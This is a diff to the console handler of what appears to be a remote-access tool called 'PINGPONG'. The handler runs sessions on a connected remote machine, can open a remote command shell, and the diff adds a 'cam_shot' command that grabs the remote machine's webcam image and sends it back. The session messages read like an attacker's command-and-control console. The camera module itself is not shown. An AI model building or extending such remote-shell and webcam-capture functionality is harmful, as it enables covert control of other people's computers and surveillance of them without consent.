@@ -67,12 +67,15 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
             print("PINGPONG>[*]running " + AUTOCOMMAND)
             command = AUTOCOMMAND
             is_Auto = True
-        if command == "exit" or command == "EXIT":
+        if command == "cam_shot" or command == "CAM_SHOT":
+            import PINGPONG_script.camera
+            PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
+        elif command == "exit" or command == "EXIT":
             conn.send(bytes("EXIT_APP", 'utf8'))
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
             main.print_normal("handler>[*]Back to main console......")
             main.main()
-        if command == "cmd" or command == "CMD":
+        elif command == "cmd" or command == "CMD":
             import PINGPONG_script.cmdshell
             if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
                 main.print_good("PINGPONG>[+]GOT IT")
@@ -92,4 +95,4 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
         else:
             print("PINGPONG>[-]Command " + command + " not found")                 
 if __name__ == "__main__":
-    startserver("192.168.140.1", "", True, True)
+    startserver("127.0.0.1", "", True, True)
